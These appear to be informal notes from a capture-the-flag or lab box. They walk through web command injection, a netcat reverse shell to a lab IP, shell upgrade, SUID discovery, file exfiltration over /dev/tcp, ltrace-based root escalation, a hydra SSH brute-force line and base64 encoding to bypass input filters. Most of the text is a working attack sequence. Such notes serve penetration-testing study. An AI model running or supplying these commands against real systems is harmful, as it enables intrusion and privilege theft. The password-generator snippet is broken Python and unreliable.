1) if we have a text area we can try to use ";ls" then if it works we will do a ";which nc" to do a reverse shell connection, then we wil open terminal and write "nc -lnvp 4444" and press enter then in the website will write the following ";nc -e /bin/bash 192.168.0.192 4444" 

then write 
python -c 'import pty;pty.spawn("/bin/bash")'

use to know ur priviledg
find / -perm -u=s 2>/dev/null

then find reset root file , then u need to copy it to your PC by using
nc -nlvp 9002 > reset_root       in ur termenal
then victom use 
cat /usr/bin/reset_root > /dev/tcp/192.168.0.192/9002
then 
chmod +x reset_root 
run
then use
ltrace ./reset_root
then use 
touch "missing files"
then run the root reset file by just writing it :)



      	a) also we can do ";cat /etc/passwd"
      	
      	
2) we use pwd to kwon where am i
3) if u have a green file just tpye "./fileName"
4) if u dont have a permission to file try to copy it to your zone
5) if u find a file try to put a passwd like : "./safe 95842"
6) small code to generate potential passwd: 
from string import ascii_uppercase
for c in ascii_uppercase:
        for x in range (0,10):
                print(c) + str(x) + "Flesh"
                print(c) + str(x) + "Curtains"
7) small hydra command
hydra -l RickSanchez -P pw.txt -t4 -s 22222 192.168.0.163 ssh -I

=============

8) some time you can find things in var dir.
9) if the website didn't allow the nc (1) we can bypass it by using "echo 'the command' | base64" then in the website take it and put "echo 'the output' | base64 -d | bash"
